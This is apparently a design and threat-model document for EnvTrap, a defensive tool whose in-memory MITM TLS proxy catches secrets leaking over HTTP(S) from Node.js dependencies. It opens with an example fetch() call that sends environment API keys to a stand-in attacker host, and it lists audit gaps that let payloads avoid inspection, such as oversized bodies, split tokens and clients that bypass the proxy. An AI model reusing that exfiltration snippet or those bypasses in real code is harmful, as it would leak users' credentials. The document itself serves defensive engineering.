# EnvTrap Network Channel Deep Dive: Architecture, Node.js Internals, and Threat Model

A developer-focused, plain-English guide to how EnvTrap stops secret theft over HTTP and HTTPS network requests, explaining Node.js networking internals, how the in-memory MITM proxy works, where current code has flaws, and what we are building next.

---

## 1. What is the Network Channel and Why is it the Biggest Threat?

### The Obvious Way Hackers Steal Secrets
When a rogue npm package or malicious dependency steals your secrets, the easiest and most direct way to send them home is over the internet using standard HTTP or HTTPS:
```javascript
fetch("https://attacker.com/collect", {
  method: "POST",
  headers: { "Authorization": `Bearer ${process.env.OPENAI_API_KEY}` },
  body: JSON.stringify({ stripe: process.env.STRIPE_SECRET_KEY })
});
```

### The HTTPS Encryption Problem
Almost all modern web traffic is encrypted with **TLS/HTTPS**.
If you look at the raw TCP packets travelling through your network, they look like random scrambled garbage.
- Firewalls, VPC egress rules, and cloud security groups only see: *"This server is talking to IP 198.51.100.4 on port 443"*.
- They **cannot read** the request path, the headers, or the body payload because they are encrypted with TLS.
- Therefore, without a local interception layer that can decrypt and inspect data before it leaves the server, an attacker can exfiltrate every database credential, Stripe key, private SSH token, and JWT inside an encrypted TLS stream, and your network monitoring tools will see nothing suspicious.

---

## 2. Node.js Internals: What Actually Happens During a Web Request?

To understand how EnvTrap catches this, we need to understand what Node.js does under the hood in plain terms:

### Node.js Internal 1: `node:net` and Sockets
At the lowest level of Node.js networking is the `net` module. A **Socket** is simply a two-way communication stream between two computers.
- In Node.js C++ core (`src/tcp_wrap.cc`), a TCP socket is backed by a Libuv handle (`uv_tcp_t`).
- When JavaScript calls `socket.write(buffer)`, Node sends raw binary bytes through the operating system's network stack (`send()` / `write()` syscalls).

### Node.js Internal 2: `node:tls` (Transport Layer Security)
When you make a secure connection (HTTPS), Node.js wraps that plain `net.Socket` inside a `tls.TLSSocket`.
- Node links directly to **OpenSSL** (compiled into the Node.js binary).
- Under the hood, Node creates an OpenSSL `SSL` object and an `SSL_CTX` (Secure Context).
- **The TLS Handshake**:
  1. The client sends a *ClientHello* containing supported ciphers and SNI (Server Name Indication).
  2. The server responds with *ServerHello* and its public X.509 Certificate.
  3. Node.js verifies that the certificate is signed by a trusted Certificate Authority (CA).
  4. Both sides negotiate symmetric session keys (using AES-GCM or ChaCha20-Poly1305).
  5. Once the handshake finishes, all subsequent `write()` calls are encrypted before hitting the raw TCP socket.

### Node.js Internal 3: `HTTP CONNECT` Tunnels
When Node.js is configured with a proxy (via `HTTP_PROXY` or `HTTPS_PROXY`), it cannot simply connect directly to `api.stripe.com`.
Instead:
1. Node opens a plain TCP socket to the proxy server (`127.0.0.1:<proxyPort>`).
2. Node sends an HTTP `CONNECT` request:
   ```text
   CONNECT api.stripe.com:443 HTTP/1.1
   Host: api.stripe.com:443
   ```
3. This says: *"Hey proxy, please establish a TCP tunnel to api.stripe.com:443 and let me talk through it"*.
4. If the proxy replies `HTTP/1.1 200 Connection Established`, Node proceeds to perform the TLS handshake directly through that tunnel.

### Node.js Internal 4: `NODE_EXTRA_CA_CERTS`
Node.js ships with a compiled-in list of trusted root Certificate Authorities (Mozilla's root bundle).
If your application connects to a server whose certificate was signed by a private or unknown CA, OpenSSL will immediately throw an error:
`UNABLE_TO_VERIFY_LEAF_SIGNATURE` or `SELF_SIGNED_CERT_IN_CHAIN`.
`NODE_EXTRA_CA_CERTS` is a special internal environment variable read by Node's C++ TLS initialization code. It tells OpenSSL: *"Load the PEM certificate from this file path and trust it as a Root CA for all TLS connections"*.

### Node.js Internal 5: The Global HTTP Agent (`http.globalAgent` / `https.globalAgent`)
In traditional Node.js code, HTTP requests share a connection pool managed by `http.Agent`. The Agent is responsible for reusing sockets and formatting request headers according to RFC 7230.
In Node.js 18+, the native `fetch()` function is built on **Undici**, which bypasses `https.globalAgent` and uses its own dispatch tree.

---

## 3. How EnvTrap Currently Protects the Network Channel

EnvTrap operates as an **In-Memory Man-In-The-Middle (MITM) TLS Proxy**. Here is how the components work together:

```
+-------------------------------------------------------------------------------+
| Monitored Application (Child Process)                                         |
|                                                                               |
|   fetch('https://attacker.com/steal')                                         |
|           |                                                                   |
|           | 1. Reads HTTP_PROXY env var                                       |
|           v                                                                   |
|   Sends: CONNECT attacker.com:443 ---------------------------------------+    |
+--------------------------------------------------------------------------|----+
                                                                           |
                                                                           v
+-------------------------------------------------------------------------------+
| EnvTrap MITM Proxy (MitmServer.ts on 127.0.0.1:<randomPort>)                  |
|                                                                               |
|  2. ConnectHandler.ts receives CONNECT tunnel request                         |
|  3. CertificateAuthority.ts generates fake cert for "attacker.com" on the fly |
|  4. tls.createServer responds "200 Connection Established"                    |
|  5. Child completes TLS Handshake (trusts cert via NODE_EXTRA_CA_CERTS)       |
|                                                                               |
|  6. TlsInterceptor.ts receives DECRYPTED plaintext HTTP request:              |
|     - Inspects Request Line, Headers (Authorization, Cookie), and Body        |
|     - Passes buffer to Scanner.ts (SecretMatcher)                             |
|                                                                               |
|  [Decision Gate]                                                              |
|   ├── Leak detected & mode === 'block':                                       |
|   │     -> Sever downstream socket immediately. No byte sent upstream.       |
|   └── Clean request or domain in exclusions.domains:                          |
|         -> UpstreamConnector.ts establishes real TLS socket to attacker.com   |
|            and relays response back.                                          |
+-------------------------------------------------------------------------------+
```

### 3.1 Where the Code Lives
- **`src/mitm/MitmServer.ts`**: Boots the local HTTP server and binds to a dynamic loopback port.
- **`src/mitm/CertificateAuthority.ts`**: Generates the ephemeral Root CA and signs on-demand domain certificates.
- **`src/mitm/ConnectHandler.ts`**: Intercepts `CONNECT` methods and sets up dynamic `tls.createServer` instances.
- **`src/mitm/TlsInterceptor.ts`**: Decrypts and buffers incoming streams, scanning for secrets using a sliding window.
- **`src/mitm/UpstreamConnector.ts`**: Opens the genuine outbound TLS connection to the remote destination.
- **`src/mitm/HttpHandler.ts`**: Handles unencrypted, plain HTTP/1.1 requests.

---

## 4. Current Flaws & Bottlenecks in EnvTrap's Network Code

A thorough audit of our MITM proxy code revealed five significant issues:

### Flaw 1: Hardcoded 1MB Buffer Clamp (Issue #44)
In `TlsInterceptor.ts`, we cap accumulated buffers to `MAX_BUFFER_BYTES = 1_048_576` (1MB). If a file upload, big GraphQL mutation, or batch database query exceeds 1MB, subsequent chunks pass through uninspected.

### Flaw 2: Hardcoded 200-Byte Packet Split Window (Issue #50)
In `TlsInterceptor.ts`, we keep `lastOverlap = combined.slice(-200)`. If a long secret (e.g. an RSA private key or 500-character AWS session token) is split across TCP packets, slicing only 200 bytes misses the secret.

### Flaw 3: Plain HTTP Body Buffering in `HttpHandler.ts` (Issue #61)
In `HttpHandler.ts`, unencrypted HTTP request bodies are accumulated entirely into an array (`bodyChunks`) before forwarding. For streaming uploads or Server-Sent Events, this breaks streaming semantics and buffers everything into memory.

### Flaw 4: Strict Exact Match in `exclusions.domains` (Issue #54)
In `ConnectHandler.ts`, domain allowlisting is checked using `this.allowedDomains.has(hostname)`. If you allow `api.stripe.com`, requests to `sub.api.stripe.com` or `files.stripe.com` are not allowed, requiring exhaustive manual enumeration.

### Flaw 5: Native `fetch` Bypass in Node 18+ (Undici)
Modern Node.js versions use Undici for `fetch()`. While EnvTrap sets `HTTP_PROXY` and `HTTPS_PROXY`, certain custom HTTP clients (like Axios with custom adapters or direct `net.connect`) bypass proxy environment variables unless patched at the module level.

---

## 5. Technical Roadmap: How We Are Upgrading the Network Channel

```
                        Decrypted Stream Chunk
                                   |
                                   v
            +---------------------------------------------+
            | Step 1: Dynamic Sliding Window              |
            | Calculate window size = max(secret.length). |
            | Guarantees long tokens split across TCP     |
            | packets are never missed.                   |
            +---------------------------------------------+
                                   |
                                   v
            +---------------------------------------------+
            | Step 2: Wildcard & CIDR Allowlist Check     |
            | Support *.stripe.com and 10.0.0.0/8 ranges  |
            | without requiring exact subdomain strings.  |
            +---------------------------------------------+
                                   |
                                   v
            +---------------------------------------------+
            | Step 3: Fast-Path Aho-Corasick Matcher      |
            | Single-pass O(N) substring search across    |
            | all known secrets simultaneously.           |
            +---------------------------------------------+
                                   |
                                   v
            +---------------------------------------------+
            | Step 4: Streaming Pipe Backpressure         |
            | Implement highWaterMark flow control        |
            | so gigabyte payloads do not exhaust RAM.    |
            +---------------------------------------------+
                                   |
                                   v
                   Forward Upstream via TLS Socket
```

---

## 6. Configuration Reference in `envtrap.json`

```json
{
  "channels": {
    "network": "block"
  },
  "network": {
    "maxPayloadBytes": 5242880,
    "bypassLoopback": true,
    "exclusions": {
      "domains": ["*.stripe.com", "api.github.com"],
      "subnets": ["10.0.0.0/8", "192.168.1.0/24"]
    }
  }
}
```

---

## 7. Summary Table

| Problem | How It Works Now | What Was Wrong | How We Are Fixing It |
|:---|:---|:---|:---|
| **Encrypted HTTPS** | Ephemeral MITM Proxy | Only catches traffic honoring `HTTP_PROXY` | Add Undici global dispatcher hook for `fetch` |
| **Buffer Overflow** | Hardcoded 1MB limit | Payloads >1MB pass uninspected | Configurable `maxPayloadBytes` (Issue #44) |
| **Packet Splits** | Fixed 200-byte slice | Keys >200 bytes split across packets escape | Dynamic window matching max secret length (Issue #50) |
| **Domain Matches** | `Set.has(hostname)` | Wildcards like `*.aws.com` not supported | Wildcard and CIDR matching engine (Issue #54) |
| **CA Validity** | 10 years / 1 year | Violates strict enterprise compliance | Configurable certificate expiration times (Issue #51) |\n